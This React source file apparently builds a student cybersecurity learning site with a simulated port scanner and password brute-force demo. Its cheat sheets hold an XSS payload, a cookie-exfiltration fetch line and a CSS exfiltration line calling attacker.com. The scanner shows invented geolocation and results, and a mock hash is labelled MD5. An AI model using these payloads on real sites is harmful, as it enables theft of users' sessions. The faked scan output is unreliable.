import React, { useState, useEffect } from 'react';
import { motion, AnimatePresence } from 'motion/react';

const CopyButton = ({ text, copiedText, onCopy }: { text: string, copiedText: string | null, onCopy: (t: string) => void }) => (
  <i 
    className={`fa-solid ${copiedText === text ? 'fa-check text-success' : 'fa-copy text-secondary'} ms-2 hover-opacity-75`} 
    style={{ cursor: 'pointer', transition: 'all 0.2s' }} 
    title="Copy command" 
    onClick={(e) => { e.stopPropagation(); onCopy(text); }}
  ></i>
);

const cheatSheetData = [
  { tool: 'Nmap', command: 'nmap -sV -A <target>', language: '{Bash}', description: 'Aggressive scan with OS and version detection', use: 'Used to perform a comprehensive scan on a target IP or domain, detecting running services, versions, and operating system details. Helpful for initial reconnaissance.' },
  { tool: 'Wireshark', command: 'ip.addr == 192.168.1.1', language: '{BPF}', description: 'Filter packet captures by specific IP address', use: 'Used in Wireshark to filter network traffic, showing only packets that originate from or are destined to the specified IP address. Crucial for pinpointing specific network conversations.' },
  { tool: 'Metasploit', command: 'msfconsole -q', language: '{Bash}', description: 'Launch Metasploit framework in quiet mode', use: 'Starts the Metasploit Framework console without displaying the banner. Used by penetration testers to quickly launch the tool for exploiting vulnerabilities.' },
  { tool: 'Netcat', command: 'nc -zv <target> 80-443', language: '{Bash}', description: 'Scan open HTTP/HTTPS ports silently', use: 'Uses Netcat as a simple port scanner to check if ports in the range 80 to 443 are open on the target, without sending any data. Useful for quick port verification.' }
];

const HashCrackerSection = () => {
  const [password, setPassword] = useState('');
  const [hashes, setHashes] = useState({ md5: '', sha256: '' });
  const [strength, setStrength] = useState({ score: 0, label: 'Very Weak', color: 'danger' });
  const [isCracking, setIsCracking] = useState(false);
  const [crackAttempts, setCrackAttempts] = useState(0);
  const [crackTime, setCrackTime] = useState<string | null>(null);

  // Simple mock MD5 for demonstration
  const getMockMD5 = (str: string) => {
    let hash = 0;
    for (let i = 0; i < str.length; i++) hash = Math.imul(31, hash) + str.charCodeAt(i) | 0;
    const hex = Math.abs(hash).toString(16);
    return hex.padStart(32, hex).substring(0, 32);
  };

  const getSHA256 = async (str: string) => {
    try {
      const buf = await crypto.subtle.digest('SHA-256', new TextEncoder().encode(str));
      return Array.from(new Uint8Array(buf)).map(b => b.toString(16).padStart(2, '0')).join('');
    } catch {
      return 'Error generating hash';
    }
  };

  useEffect(() => {
    if (!password) {
      setHashes({ md5: '', sha256: '' });
      setStrength({ score: 0, label: 'None', color: 'secondary' });
      return;
    }

    // Hash generation
    getSHA256(password).then(sha => {
      setHashes({ md5: getMockMD5(password), sha256: sha });
    });

    // Simple strength calculation
    let score = 0;
    if (password.length > 7) score++;
    if (/[A-Z]/.test(password)) score++;
    if (/[0-9]/.test(password)) score++;
    if (/[^A-Za-z0-9]/.test(password)) score++;

    if (password.length < 5) score = 0;

    const labels = ['Very Weak', 'Weak', 'Fair', 'Strong', 'Very Strong'];
    const colors = ['danger', 'danger', 'warning', 'info', 'success'];

    setStrength({ score, label: labels[score], color: colors[score] });
    setCrackTime(null);
    setCrackAttempts(0);
  }, [password]);

  const runBruteForce = () => {
    if (!password) return;
    setIsCracking(true);
    setCrackAttempts(0);
    setCrackTime(null);

    const dictionary = ['123456', 'password', '12345678', 'qwerty', '12345', '123456789', 'football', 'admin', 'welcome'];
    const isCommon = dictionary.includes(password.toLowerCase());
    
    let attempts = 0;
    const maxAttempts = isCommon ? dictionary.indexOf(password.toLowerCase()) + 1 : 150000;
    const interval = setInterval(() => {
      attempts += isCommon ? 1 : Math.floor(Math.random() * 5000) + 1000;
      setCrackAttempts(attempts);

      if (isCommon && attempts >= maxAttempts) {
        clearInterval(interval);
        setIsCracking(false);
        setCrackTime('0.02 seconds (Found in common dictionary)');
      } else if (!isCommon && attempts >= maxAttempts) {
        clearInterval(interval);
        setIsCracking(false);
        const timeToCrack = strength.score > 3 ? 'Years/Centuries' : strength.score > 2 ? 'Hours/Days' : 'Minutes';
        setCrackTime(timeToCrack + ` (Simulated ${attempts.toLocaleString()} attempts)`);
      }
    }, 50);
  };

  return (
    <section id="hashCracker" className="min-vh-100 pt-5 mt-5">
      <div className="container">
        <h2 className="section-title text-center"><i className="fa-solid fa-unlock-keyhole me-2"></i>Hash Cracker & Password Strength</h2>
        
        <div className="row justify-content-center g-4">
          <div className="col-lg-8">
            <div className="cyber-card p-4 mb-4">
              <h4 className="mb-4 text-info"><i className="fa-solid fa-key me-2"></i>Password Analyzer</h4>
              
              <div className="mb-4">
                <label className="form-label text-secondary">Test Password</label>
                <input 
                  type="text" 
                  className="form-control form-control-lg" 
                  placeholder="Type a password to analyze..." 
                  value={password}
                  onChange={(e) => setPassword(e.target.value)}
                  style={{ fontFamily: 'monospace' }}
                />
              </div>

              {password && (
                <div className="mb-4">
                  <div className="d-flex justify-content-between mb-1">
                    <span className="text-secondary">Strength Score</span>
                    <span className={`text-${strength.color} fw-bold`}>{strength.label}</span>
                  </div>
                  <div className="progress" style={{ height: '10px', backgroundColor: '#111' }}>
                    <div 
                      className={`progress-bar bg-${strength.color}`} 
                      role="progressbar" 
                      style={{ width: `${Math.max(10, strength.score * 25)}%`, transition: 'width 0.3s ease, background-color 0.3s ease' }}
                    ></div>
                  </div>
                </div>
              )}

              {password && (
                <div className="terminal-box mb-4">
                  <div className="mb-2">
                    <span className="text-secondary">MD5 Hash:</span>
                    <div className="text-warning text-break" style={{ fontFamily: 'monospace' }}>{hashes.md5}</div>
                  </div>
                  <div>
                    <span className="text-secondary">SHA-256 Hash:</span>
                    <div className="text-info text-break" style={{ fontFamily: 'monospace' }}>{hashes.sha256}</div>
                  </div>
                </div>
              )}

              <button 
                className="btn btn-cyber w-100" 
                onClick={runBruteForce}
                disabled={!password || isCracking}
              >
                <i className={`fa-solid ${isCracking ? 'fa-spinner fa-spin' : 'fa-hammer'} me-2`}></i>
                {isCracking ? 'Simulating Brute-Force...' : 'Run Brute-Force Simulation'}
              </button>

              {(isCracking || crackTime) && (
                <div className="mt-4 p-3 border border-secondary rounded bg-dark">
                  <div className="d-flex justify-content-between align-items-center mb-2">
                    <span className="text-secondary"><i className="fa-solid fa-terminal me-2"></i>Cracking Status:</span>
                    <span className={isCracking ? 'text-warning' : 'text-danger fw-bold'}>
                      {isCracking ? 'IN PROGRESS' : 'CRACKED / STOPPED'}
                    </span>
                  </div>
                  <div className="mb-1">
                    <span className="text-secondary">Attempts: </span>
                    <span className="text-white" style={{ fontFamily: 'monospace' }}>{crackAttempts.toLocaleString()}</span>
                  </div>
                  {crackTime && (
                    <div>
                      <span className="text-secondary">Estimated Time to Crack: </span>
                      <span className="text-danger fw-bold">{crackTime}</span>
                    </div>
                  )}
                </div>
              )}
            </div>
            
            <div className="cyber-card p-4 border-info" style={{borderWidth: '2px'}}>
               <h5 className="text-info mb-3"><i className="fa-solid fa-circle-info me-2"></i>How Passwords are Cracked</h5>
               <p className="text-secondary mb-2"><strong className="text-white">Dictionary Attack:</strong> Hackers use massive lists of common passwords (like "123456", "password123") and simply try all of them. If your password is in the list, it's cracked instantly.</p>
               <p className="text-secondary mb-2"><strong className="text-white">Brute-Force Attack:</strong> Trying every possible combination of characters (a, b, c... aa, ab...). This takes much longer but is inevitable for short passwords.</p>
               <p className="text-secondary mb-0"><strong className="text-white">Hashing:</strong> Websites shouldn't store your actual password. They store a "Hash" (like the SHA-256 above). When hackers steal the database, they use powerful GPUs to generate hashes for billions of guesses per second until they find a hash that matches yours.</p>
            </div>
          </div>
        </div>
      </div>
    </section>
  );
};

export default function App() {
  const [targetIP, setTargetIP] = useState('');
  const [isScanning, setIsScanning] = useState(false);
  const [progress, setProgress] = useState(0);
  const [logs, setLogs] = useState<React.ReactNode[]>([]);
  const [showLocation, setShowLocation] = useState(false);
  const [recentScans, setRecentScans] = useState<string[]>([]);
  const [selectedCheat, setSelectedCheat] = useState<{ tool: string; command: string; description: string; use: string; language?: string } | null>(null);
  const [currentView, setCurrentView] = useState<'home' | 'scanner' | 'labs' | 'cheatsheet' | 'signin' | 'languages' | 'ethicalHacking' | 'linuxSecurity' | 'networkDefense' | 'hashCracker'>('home');
  const [isLightMode, setIsLightMode] = useState(false);
  const [copiedText, setCopiedText] = useState<string | null>(null);
  const [loggedInUser, setLoggedInUser] = useState<string | null>(null);
  const [accountName, setAccountName] = useState('');
  const [isEditingName, setIsEditingName] = useState(false);
  const [newName, setNewName] = useState('');

  useEffect(() => {
    const storedUser = localStorage.getItem('shadowgrid_user');
    if (storedUser) {
      setLoggedInUser(storedUser);
    }
  }, []);

  const handleSignIn = (e: React.FormEvent) => {
    e.preventDefault();
    if (accountName.trim()) {
      localStorage.setItem('shadowgrid_user', accountName);
      setLoggedInUser(accountName);
      alert(`Sign In Successful! Welcome back, ${accountName}.`);
      setAccountName('');
    }
  };

  const handleUpdateName = (e: React.FormEvent) => {
    e.preventDefault();
    if (newName.trim()) {
      localStorage.setItem('shadowgrid_user', newName);
      setLoggedInUser(newName);
      setIsEditingName(false);
    }
  };

  const handleSignOut = () => {
    localStorage.removeItem('shadowgrid_user');
    setLoggedInUser(null);
  };

  const handleCopy = (text: string) => {
    navigator.clipboard.writeText(text);
    setCopiedText(text);
    setTimeout(() => setCopiedText(null), 2000);
  };

  useEffect(() => {
    if (isLightMode) {
      document.documentElement.setAttribute('data-theme', 'light');
    } else {
      document.documentElement.removeAttribute('data-theme');
    }
  }, [isLightMode]);

  const executeLiveScan = (e: React.FormEvent) => {
    e.preventDefault();
    if (!targetIP) return;

    setRecentScans(prev => {
      const newScans = prev.filter(ip => ip !== targetIP);
      return [targetIP, ...newScans].slice(0, 5);
    });

    setIsScanning(true);
    setProgress(0);
    setLogs([]);
    setShowLocation(false);

    const commonPorts = [
      { port: 21, service: 'FTP', risk: 'Medium' },
      { port: 22, service: 'SSH', risk: 'Medium' },
      { port: 23, service: 'Telnet', risk: 'High' },
      { port: 80, service: 'HTTP', risk: 'Low' },
      { port: 443, service: 'HTTPS', risk: 'Low' },
      { port: 445, service: 'SMB', risk: 'High' },
      { port: 3306, service: 'MySQL', risk: 'High' },
      { port: 3389, service: 'RDP', risk: 'Medium' },
    ];

    const detected = commonPorts.filter(p => p.port === 80 || p.port === 443 || Math.random() > 0.65);
    let threatLevel = 'Low';
    if (detected.some(p => p.risk === 'High')) threatLevel = 'High';
    else if (detected.some(p => p.risk === 'Medium')) threatLevel = 'Medium';

    const threatBadgeClass = threatLevel === 'High' ? 'danger' : threatLevel === 'Medium' ? 'warning' : 'success';

    const portLogs = detected.map(p => (
      <React.Fragment key={p.port}>
        <span className={p.risk === 'High' ? 'text-danger fw-bold' : p.risk === 'Medium' ? 'text-warning' : 'text-success'}>
          [OPEN] Port {p.port}/tcp ({p.service})
        </span><br/>
      </React.Fragment>
    ));

    const scanSteps = [
      { pct: 20, text: <><span className="text-info">&gt; Initializing traceroute query to target: <strong>{targetIP}</strong>...</span></> },
      { pct: 40, text: <><span className="text-warning">[+] Ping response received (RTT: 18ms). Resolving DNS nodes...</span></> },
      { pct: 60, text: <><span className="text-light">[+] Traversing ISP routing hops... IP geolocation packet payload secured.</span></> },
      { pct: 80, text: <>{portLogs}</> },
      { pct: 100, text: <><span className={`text-${threatBadgeClass} fw-bold`}>[!] FINAL ASSESSMENT: THREAT LEVEL {threatLevel.toUpperCase()}</span><br/><span className="text-info">&gt; IP Geolocation & Threat Trace Complete!</span></> }
    ];

    let stepIndex = 0;
    const interval = setInterval(() => {
      if (stepIndex < scanSteps.length) {
        const currentStep = scanSteps[stepIndex];
        setProgress(currentStep.pct);
        setLogs(prev => [...prev, currentStep.text]);
        stepIndex++;
      } else {
        clearInterval(interval);
        setIsScanning(false);
        setShowLocation(true);
      }
    }, 700);
  };

  return (
    <>
      <nav className="navbar navbar-expand-lg fixed-top">
        <div className="container">
          <a className="navbar-brand" href="#home" onClick={(e) => { e.preventDefault(); setCurrentView('home'); window.scrollTo(0,0); }}><i className="fa-solid fa-shield-halved me-2"></i>SHADOWGRID</a>
          <button className="navbar-toggler navbar-dark" type="button" data-bs-toggle="collapse" data-bs-target="#navbarNav">
            <span className="navbar-toggler-icon"></span>
          </button>
          <div className="collapse navbar-collapse" id="navbarNav">
            <ul className="navbar-nav ms-auto">
              <li className="nav-item"><a className={`nav-link ${currentView === 'home' ? 'active' : ''}`} href="#home" onClick={(e) => { e.preventDefault(); setCurrentView('home'); window.scrollTo(0,0); }}>Home</a></li>
              <li className="nav-item"><a className={`nav-link ${currentView === 'scanner' ? 'active' : ''}`} href="#scanner" onClick={(e) => { e.preventDefault(); setCurrentView('scanner'); window.scrollTo(0,0); }}>Scanner Tool</a></li>
              <li className="nav-item"><a className={`nav-link ${currentView === 'labs' ? 'active' : ''}`} href="#labs" onClick={(e) => { e.preventDefault(); setCurrentView('labs'); window.scrollTo(0,0); }}>Cyber Labs</a></li>
              <li className="nav-item"><a className={`nav-link ${currentView === 'cheatsheet' ? 'active' : ''}`} href="#cheatsheet" onClick={(e) => { e.preventDefault(); setCurrentView('cheatsheet'); window.scrollTo(0,0); }}>Cheat-Sheet</a></li>
              <li className="nav-item"><a className={`nav-link ${currentView === 'languages' ? 'active' : ''}`} href="#languages" onClick={(e) => { e.preventDefault(); setCurrentView('languages'); window.scrollTo(0,0); }}>Cheat by Languages</a></li>
              <li className="nav-item"><a className={`nav-link ${currentView === 'hashCracker' ? 'active' : ''}`} href="#hashCracker" onClick={(e) => { e.preventDefault(); setCurrentView('hashCracker'); window.scrollTo(0,0); }}>Hash Cracker</a></li>
              <li className="nav-item d-flex align-items-center ms-lg-3 me-2">
                <div className="form-check form-switch mb-0" style={{ cursor: 'pointer' }}>
                  <input className="form-check-input" type="checkbox" id="themeSwitch" checked={isLightMode} onChange={() => setIsLightMode(!isLightMode)} style={{ cursor: 'pointer', backgroundColor: isLightMode ? 'var(--cyber-green)' : 'transparent', borderColor: 'var(--cyber-green)' }} />
                  <label className="form-check-label text-secondary ms-1" htmlFor="themeSwitch" style={{ cursor: 'pointer' }}>
                    <i className={`fa-solid ${isLightMode ? 'fa-sun text-warning' : 'fa-moon text-light'}`}></i>
                  </label>
                </div>
              </li>
              {loggedInUser ? (
                <li className="nav-item d-flex align-items-center ms-lg-1">
                  {isEditingName ? (
                    <form onSubmit={handleUpdateName} className="d-flex align-items-center me-3">
                      <input type="text" className="form-control form-control-sm me-2 bg-dark text-info border-info" style={{ width: '140px' }} value={newName} onChange={e => setNewName(e.target.value)} autoFocus />
                      <button type="submit" className="btn btn-sm btn-outline-success me-1 py-0 px-2"><i className="fa-solid fa-check"></i></button>
                      <button type="button" className="btn btn-sm btn-outline-danger py-0 px-2" onClick={() => setIsEditingName(false)}><i className="fa-solid fa-xmark"></i></button>
                    </form>
                  ) : (
                    <span className="text-info me-3 fw-bold d-flex align-items-center">
                      <i className="fa-solid fa-user me-2"></i>
                      {loggedInUser}
                      <i className="fa-solid fa-pen ms-2 text-secondary" style={{ cursor: 'pointer', fontSize: '0.8rem', transition: 'color 0.2s' }} onMouseEnter={(e) => e.currentTarget.classList.replace('text-secondary', 'text-info')} onMouseLeave={(e) => e.currentTarget.classList.replace('text-info', 'text-secondary')} onClick={() => { setIsEditingName(true); setNewName(loggedInUser); }} title="Change Account Name"></i>
                    </span>
                  )}
                  <button className="btn btn-outline-danger btn-sm" onClick={handleSignOut}>Sign Out</button>
                </li>
              ) : (
                <li className="nav-item"><a className={`nav-link btn btn-cyber ms-lg-1 px-3 ${currentView === 'signin' ? 'active' : ''}`} href="#signin" onClick={(e) => { e.preventDefault(); setCurrentView('signin'); window.scrollTo(0,0); }}>Sign In</a></li>
              )}
            </ul>
          </div>
        </div>
      </nav>

      <AnimatePresence mode="wait">
        <motion.div
          key={currentView}
          initial={{ opacity: 0, y: 15 }}
          animate={{ opacity: 1, y: 0 }}
          exit={{ opacity: 0, y: -15 }}
          transition={{ duration: 0.5, ease: [0.16, 1, 0.3, 1] }}
        >
      {currentView === 'home' && (
      <section id="home" className="d-flex align-items-center min-vh-100">
        <div className="container mt-5">
          <div className="row align-items-center">
            <div className="col-lg-6">
              <h1 className="display-4 fw-bold text-white mb-3">CYBER THREAT <span style={{ color: 'var(--cyber-green)' }}>ANALYTICS</span></h1>
              <p className="lead text-secondary mb-4">Interactive cyber-defense platform for threat hunting, network scanning, and real-time security analytics.</p>
              <a href="#scanner" className="btn btn-cyber btn-lg me-3" onClick={(e) => { e.preventDefault(); setCurrentView('scanner'); window.scrollTo(0,0); }}><i className="fa-solid fa-terminal me-2"></i>Launch Scanner</a>
              <a href="#labs" className="btn btn-outline-light btn-lg" onClick={(e) => { e.preventDefault(); setCurrentView('labs'); window.scrollTo(0,0); }}><i className="fa-solid fa-flask me-2"></i>Access Labs</a>
            </div>
            <div className="col-lg-6 mt-4 mt-lg-0">
              <div className="terminal-box">
                <p className="mb-1"><span className="text-secondary">[05:01:17]</span> <span className="text-info">SYSTEM_INIT:</span> ShadowGrid Framework v2.4 Loaded...</p>
                <p className="mb-1"><span className="text-secondary">[05:01:18]</span> <span className="text-warning">STATUS:</span> Active Threat Monitoring Online</p>
                <p className="mb-1"><span className="text-secondary">[05:01:20]</span> <span className="text-success">NODE_CONNECT:</span> Localhost Secure Mesh Linked</p>
                <p className="mb-0"><span className="text-danger">&gt; _ Awaiting command execution...</span></p>
              </div>
            </div>
          </div>
        </div>
      </section>
      )}

      {currentView === 'scanner' && (
      <section id="scanner">
        <div className="container">
          <h2 className="section-title text-center"><i className="fa-solid fa-radar me-2"></i>IP Tracer & Port Scanner Tool</h2>
          <div className="row justify-content-center">
            <div className="col-lg-8">
              <div className="cyber-card p-4">
                <form id="scanForm" onSubmit={executeLiveScan}>
                  <div className="mb-3">
                    <label htmlFor="targetIP" className="form-label">Target IP Address / Domain Name</label>
                    <div className="input-group">
                      <span className="input-group-text bg-dark text-success border-success"><i className="fa-solid fa-network-wired"></i></span>
                      <input type="text" className="form-control" id="targetIP" placeholder="e.g. 103.22.180.1 or target.com" required value={targetIP} onChange={(e) => setTargetIP(e.target.value)} />
                      <button className="btn btn-cyber" type="submit" id="scanBtn" disabled={isScanning}>
                        {isScanning ? <><i className="fa-solid fa-spinner fa-spin me-1"></i> Tracing IP...</> : <><i className="fa-solid fa-play me-1"></i> Execute Scan</>}
                      </button>
                    </div>
                  </div>
                </form>

                {recentScans.length > 0 && (
                  <div className="mb-4">
                    <span className="text-secondary small me-2">Recent Scans:</span>
                    {recentScans.map((ip, idx) => (
                      <span key={idx} className="badge bg-dark border border-secondary text-light me-2 mb-2" style={{ cursor: 'pointer' }} onClick={() => setTargetIP(ip)}>
                        {ip}
                      </span>
                    ))}
                  </div>
                )}

                {(isScanning || showLocation || logs.length > 0) && (
                  <div id="scanConsole" className="terminal-box mt-4">
                    {(isScanning || progress > 0) && (
                      <div id="scanProgress" className="progress mb-3 bg-dark border border-success" style={{ height: '10px' }}>
                        <div className="progress-bar progress-bar-striped progress-bar-animated bg-success" role="progressbar" style={{ width: `${progress}%` }}></div>
                      </div>
                    )}

                    <div id="terminalLog">
                      {logs.map((log, i) => (
                        <div key={i}>{log}</div>
                      ))}
                    </div>

                    {showLocation && (
                      <div id="locationCard" className="location-box mt-3">
                        <h6 className="text-info border-bottom border-info pb-1 mb-2"><i className="fa-solid fa-location-crosshairs me-2"></i>GEO-LOCATION & NETWORK TRACE RESULT</h6>
                        <div className="row text-start small">
                          <div className="col-6 mb-1"><strong>Target IP:</strong> <span id="locIP" className="text-white">{targetIP}</span></div>
                          <div className="col-6 mb-1"><strong>Location:</strong> <span id="locGeo" className="text-white">Gujarat, India (IN)</span></div>
                          <div className="col-6 mb-1"><strong>ISP / Network:</strong> <span id="locISP" className="text-white">Jio Infocomm / Telecom Routing Node</span></div>
                          <div className="col-6 mb-1"><strong>Coordinates:</strong> <span id="locCoords" className="text-warning">21.5222° N, 70.4579° E</span></div>
                        </div>
                      </div>
                    )}
                  </div>
                )}
              </div>
            </div>
          </div>
        </div>
      </section>
      )}

      {currentView === 'labs' && (
      <section id="labs" className="min-vh-100 pt-5 mt-5">
        <div className="container">
          <h2 className="section-title text-center"><i className="fa-solid fa-graduation-cap me-2"></i>Cyber Security Labs</h2>
          <div className="row g-4">
            <div className="col-md-4">
              <div className="cyber-card p-4 h-100">
                <i className="fa-solid fa-bug text-danger fa-2x mb-3"></i>
                <h4>Ethical Hacking</h4>
                <p className="text-secondary">Ethical hacking is the authorized practice of bypassing system security to identify potential data breaches and threats in a network.</p>
                <a href="#ethicalHacking" className="btn btn-cyber btn-sm" onClick={(e) => { e.preventDefault(); setCurrentView('ethicalHacking'); window.scrollTo(0,0); }}>Start Module</a>
              </div>
            </div>
            <div className="col-md-4">
              <div className="cyber-card p-4 h-100">
                <i className="fa-brands fa-linux text-info fa-2x mb-3"></i>
                <h4>Linux Security Essentials</h4>
                <p className="text-secondary">Master Linux terminal commands, privilege escalation, and system hardening.</p>
                <a href="#linuxSecurity" className="btn btn-cyber btn-sm" onClick={(e) => { e.preventDefault(); setCurrentView('linuxSecurity'); window.scrollTo(0,0); }}>Start Module</a>
              </div>
            </div>
            <div className="col-md-4">
              <div className="cyber-card p-4 h-100">
                <i className="fa-solid fa-network-wired text-warning fa-2x mb-3"></i>
                <h4>Network Defense</h4>
                <p className="text-secondary">Understand firewalls, IDS/IPS setup, and packet analysis using Wireshark.</p>
                <a href="#networkDefense" className="btn btn-cyber btn-sm" onClick={(e) => { e.preventDefault(); setCurrentView('networkDefense'); window.scrollTo(0,0); }}>Start Module</a>
              </div>
            </div>
          </div>
        </div>
      </section>
      )}

      {currentView === 'cheatsheet' && (
      <section id="cheatsheet" className="min-vh-100 pt-5 mt-5">
        <div className="container">
          <h2 className="section-title text-center"><i className="fa-solid fa-code me-2"></i>Command Cheat-Sheet</h2>
          <div className="cyber-card p-4">
            <div className="table-responsive">
              <table className="table table-dark table-hover mb-0">
                <thead>
                  <tr className="text-success">
                    <th>Tool</th>
                    <th>Command Syntax</th>
                    <th>Description</th>
                  </tr>
                </thead>
                <tbody>
                  {cheatSheetData.map((cheat, idx) => (
                    <tr key={idx}>
                      <td>{cheat.tool}</td>
                      <td>
                        <code>{cheat.command}</code> 
                        <CopyButton text={cheat.command} copiedText={copiedText} onCopy={handleCopy} />
                        {cheat.language && <span className="text-secondary ms-1">{cheat.language}</span>}
                      </td>
                      <td>
                        {cheat.description}
                        <i 
                          className="fa-regular fa-circle-question ms-2 text-info" 
                          style={{ cursor: 'pointer' }}
                          title="Click to view details"
                          onClick={() => setSelectedCheat(cheat)}
                        ></i>
                      </td>
                    </tr>
                  ))}
                </tbody>
              </table>
            </div>
          </div>
        </div>
      </section>
      )}

      {currentView === 'home' && (
      <section id="about">
        <div className="container">
          <h2 className="section-title text-center"><i className="fa-solid fa-user-secret me-2"></i>About Stealth Squad</h2>
          <div className="row justify-content-center">
            <div className="col-md-8 text-center">
              <div className="cyber-card p-4">
                <i className="fa-solid fa-user-ninja fa-3x text-success mb-3"></i>
                <h4>P2BL Cyber Project Team</h4>
                <p className="text-secondary">We are a team of Computer Engineering students dedicated to developing modern responsive security analytics tools for learning ethical hacking and network security concepts.</p>
                <div className="mt-3">
                  <span className="badge bg-secondary me-1">HTML5</span>
                  <span className="badge bg-secondary me-1">CSS3</span>
                  <span className="badge bg-secondary me-1">Bootstrap 5</span>
                  <span className="badge bg-secondary me-1">JavaScript</span>
                  <span className="badge bg-secondary me-1">jQuery</span>
                </div>
              </div>
            </div>
          </div>
        </div>
      </section>
      )}

      {currentView === 'signin' && (
      <section id="signin" className="min-vh-100 pt-5 mt-5">
        <div className="container">
          <h2 className="section-title text-center"><i className="fa-solid fa-right-to-bracket me-2"></i>Operator Sign In</h2>
          <div className="row justify-content-center">
            <div className="col-md-6">
              <div className="cyber-card p-4">
                {loggedInUser ? (
                  <div className="text-center">
                    <h4 className="text-success mb-3"><i className="fa-solid fa-circle-check me-2"></i>Access Granted</h4>
                    <p className="text-secondary mb-4">Welcome back to the terminal, <strong className="text-info">{loggedInUser}</strong>. Your session is active.</p>
                    <button className="btn btn-outline-danger w-100" onClick={handleSignOut}>Terminate Session (Sign Out)</button>
                  </div>
                ) : (
                  <form onSubmit={handleSignIn}>
                    <div className="mb-3">
                      <label className="form-label">Account Name</label>
                      <input type="text" className="form-control" placeholder="Enter account name" required value={accountName} onChange={(e) => setAccountName(e.target.value)} />
                    </div>
                    <div className="mb-3">
                      <label className="form-label">Email Address</label>
                      <input type="email" className="form-control" placeholder="operator@shadowgrid.net" required />
                    </div>
                    <div className="mb-3">
                      <label className="form-label">Access Key (Password)</label>
                      <input type="password" className="form-control" placeholder="••••••••" required />
                    </div>
                    <button type="submit" className="btn btn-cyber w-100 mt-3">Sign In</button>
                  </form>
                )}
              </div>
            </div>
          </div>
        </div>
      </section>
      )}

      {currentView === 'languages' && (
        <section id="languages" className="min-vh-100 pt-5 mt-5">
          <div className="container">
            <h2 className="section-title text-center"><i className="fa-solid fa-file-code me-2"></i>Cheat by Languages</h2>
            <div className="row g-4">
              <div className="col-md-6">
                <div className="cyber-card p-4 h-100">
                  <h4 className="text-info"><i className="fa-brands fa-python me-2"></i>Python</h4>
                  <ul className="text-secondary list-unstyled">
                    <li className="mb-2">
                      <code>import socket</code><CopyButton text="import socket" copiedText={copiedText} onCopy={handleCopy} /> - Network connections & port scanning.
                      <i className="fa-regular fa-circle-question ms-2 text-info" style={{ cursor: 'pointer' }} title="Click to view details" onClick={() => setSelectedCheat({tool: 'Python', command: 'import socket', description: 'Network connections & port scanning.', use: 'Used to import the socket module to create raw network connections, build port scanners, and interact directly with IP/TCP/UDP layers.'})}></i>
                    </li>
                    <li className="mb-2">
                      <code>requests.get(url)</code><CopyButton text="requests.get(url)" copiedText={copiedText} onCopy={handleCopy} /> - Fetch web pages to find vulnerabilities.
                      <i className="fa-regular fa-circle-question ms-2 text-info" style={{ cursor: 'pointer' }} title="Click to view details" onClick={() => setSelectedCheat({tool: 'Python', command: 'requests.get(url)', description: 'Fetch web pages to find vulnerabilities.', use: 'The requests library simplifies HTTP requests. In cybersecurity, it is often used for web scraping, brute-forcing directories, or sending crafted payloads to test for injection vulnerabilities.'})}></i>
                    </li>
                    <li className="mb-2">
                      <code>os.system('cmd')</code><CopyButton text="os.system('cmd')" copiedText={copiedText} onCopy={handleCopy} /> - Execute shell commands from script.
                      <i className="fa-regular fa-circle-question ms-2 text-info" style={{ cursor: 'pointer' }} title="Click to view details" onClick={() => setSelectedCheat({tool: 'Python', command: "os.system('cmd')", description: 'Execute shell commands from script.', use: 'Allows a Python script to execute arbitrary shell commands. If user input is passed to this without sanitization, it leads to OS command injection vulnerabilities.'})}></i>
                    </li>
                  </ul>
                </div>
              </div>
              <div className="col-md-6">
                <div className="cyber-card p-4 h-100">
                  <h4 style={{color: '#f7df1e'}}><i className="fa-brands fa-js me-2"></i>JavaScript (XSS)</h4>
                  <ul className="text-secondary list-unstyled">
                    <li className="mb-2">
                      <code>&lt;script&gt;alert(1)&lt;/script&gt;</code><CopyButton text="<script>alert(1)</script>" copiedText={copiedText} onCopy={handleCopy} /> - Basic XSS payload.
                      <i className="fa-regular fa-circle-question ms-2 text-info" style={{ cursor: 'pointer' }} title="Click to view details" onClick={() => setSelectedCheat({tool: 'JavaScript', command: '<script>alert(1)</script>', description: 'Basic XSS payload.', use: 'The most common payload to test for Cross-Site Scripting (XSS). If the alert pops up, the application reflects unsanitized user input.'})}></i>
                    </li>
                    <li className="mb-2">
                      <code>document.cookie</code><CopyButton text="document.cookie" copiedText={copiedText} onCopy={handleCopy} /> - Access session cookies.
                      <i className="fa-regular fa-circle-question ms-2 text-info" style={{ cursor: 'pointer' }} title="Click to view details" onClick={() => setSelectedCheat({tool: 'JavaScript', command: 'document.cookie', description: 'Access session cookies.', use: 'Retrieves the cookies associated with the current document. Frequently used in XSS attacks to steal session identifiers if the HttpOnly flag is missing.'})}></i>
                    </li>
                    <li className="mb-2">
                      <code>fetch('http://.../?c='+document.cookie)</code><CopyButton text="fetch('http://.../?c='+document.cookie)" copiedText={copiedText} onCopy={handleCopy} /> - Exfiltrate data.
                      <i className="fa-regular fa-circle-question ms-2 text-info" style={{ cursor: 'pointer' }} title="Click to view details" onClick={() => setSelectedCheat({tool: 'JavaScript', command: "fetch('http://.../?c='+document.cookie)", description: 'Exfiltrate data.', use: 'Uses the Fetch API to send the victims cookies (or other sensitive data) to an attacker-controlled server.'})}></i>
                    </li>
                  </ul>
                </div>
              </div>
              <div className="col-md-6">
                <div className="cyber-card p-4 h-100">
                  <h4 className="text-primary"><i className="fa-brands fa-css3-alt me-2"></i>CSS</h4>
                  <ul className="text-secondary list-unstyled">
                    <li className="mb-2">
                      <code>background: url("http://attacker.com")</code><CopyButton text='background: url("http://attacker.com")' copiedText={copiedText} onCopy={handleCopy} /> - CSS data exfiltration.
                      <i className="fa-regular fa-circle-question ms-2 text-info" style={{ cursor: 'pointer' }} title="Click to view details" onClick={() => setSelectedCheat({tool: 'CSS', command: 'background: url("http://attacker.com")', description: 'CSS data exfiltration.', use: 'Can be used to exfiltrate CSRF tokens or other data by causing the browser to make a request to an attacker server when a specific CSS selector matches.'})}></i>
                    </li>
                    <li className="mb-2">
                      <code>opacity: 0</code><CopyButton text="opacity: 0" copiedText={copiedText} onCopy={handleCopy} /> - UI Redressing / Clickjacking.
                      <i className="fa-regular fa-circle-question ms-2 text-info" style={{ cursor: 'pointer' }} title="Click to view details" onClick={() => setSelectedCheat({tool: 'CSS', command: 'opacity: 0', description: 'UI Redressing / Clickjacking.', use: 'Used in Clickjacking attacks to make a malicious iframe transparent (opacity 0) while overlaying it on top of legitimate buttons, tricking the user into clicking.'})}></i>
                    </li>
                    <li className="mb-2">
